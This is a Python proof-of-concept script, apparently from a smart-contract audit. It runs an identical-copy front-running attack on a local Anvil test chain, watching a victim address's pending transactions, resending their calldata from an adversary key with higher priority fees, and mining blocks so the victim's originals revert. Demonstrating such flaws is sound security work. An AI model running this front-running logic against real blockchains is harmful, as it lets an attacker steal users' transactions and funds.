#!/usr/bin/env python3
"""C4 identical-copy front-runner. With automine off, watch Anvil's pending pool for transactions
from VICTIM, re-send each one's calldata (and value) to the same contract from ADVERSARY with a
higher priority fee, then mine one block, so the copy orders first and the original reverts.

env: RPC, VICTIM (address), ADVERSARY_PK, STOP (stop file), LOG (jsonl)
"""
import json, os, sys, time, urllib.request, subprocess

RPC = os.environ.get("RPC", "http://127.0.0.1:8545")
VICTIM = os.environ["VICTIM"].lower()
PK = os.environ["ADVERSARY_PK"]
STOP = os.environ.get("STOP", "/tmp/copier.stop")
LOG = os.environ.get("LOG", "/tmp/copier.jsonl")
ONLY_SELECTOR = os.environ.get("ONLY_SELECTOR")        # copy only this 4-byte selector
MAX_COPIES = int(os.environ.get("MAX_COPIES", "0"))     # stop copying after N (0 = no limit); keep mining
CAST = os.path.expanduser("~/.foundry/bin/cast")


def rpc(method, params=None):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params or []}).encode()
    req = urllib.request.Request(RPC, body, {"content-type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=30).read())["result"]


def pending():
    pool = rpc("txpool_content")
    out = []
    for frm, by_nonce in pool.get("pending", {}).items():
        if frm.lower() == VICTIM:
            for nonce, tx in by_nonce.items():
                out.append(tx)
    return out


seen = set()
total_copied = 0
log = open(LOG, "a")
print("copier watching", VICTIM, flush=True)
while not os.path.exists(STOP):
    txs = pending()
    copied = 0
    for tx in txs:
        h = tx["hash"]
        if h in seen:
            continue
        seen.add(h)
        if ONLY_SELECTOR and tx["input"][:10] != ONLY_SELECTOR:
            continue
        if MAX_COPIES and total_copied >= MAX_COPIES:
            continue
        prio = int(tx.get("maxPriorityFeePerGas", "0x1"), 16)
        fee = int(tx.get("maxFeePerGas", tx.get("gasPrice", "0x10")), 16)
        gas = int(tx["gas"], 16)
        args = [CAST, "send", "--rpc-url", RPC, "--private-key", PK, "--async", "--gas-limit", str(gas + 50000),
                "--priority-gas-price", str(prio * 4 + 1), "--gas-price", str(fee * 4 + 1),
                "--value", str(int(tx.get("value", "0x0"), 16)), tx["to"], tx["input"]]
        r = subprocess.run(args, capture_output=True, text=True)
        rec = {"t": time.time(), "victim_tx": h, "to": tx["to"], "selector": tx["input"][:10], "nonce": int(tx["nonce"], 16),
               "copy": r.stdout.strip(), "err": r.stderr.strip()[:200]}
        log.write(json.dumps(rec) + "\n"); log.flush()
        print("copied", rec["selector"], "victim", h[:12], "->", rec["copy"][:14] or rec["err"][:80], flush=True)
        copied += 1
        total_copied += 1
    # The copier is the only miner while it runs: copies enter the pool first, then one block a second.
    if copied:
        time.sleep(0.3)
    rpc("anvil_mine", ["0x1"])
    time.sleep(1.0)
print("copier stopped")
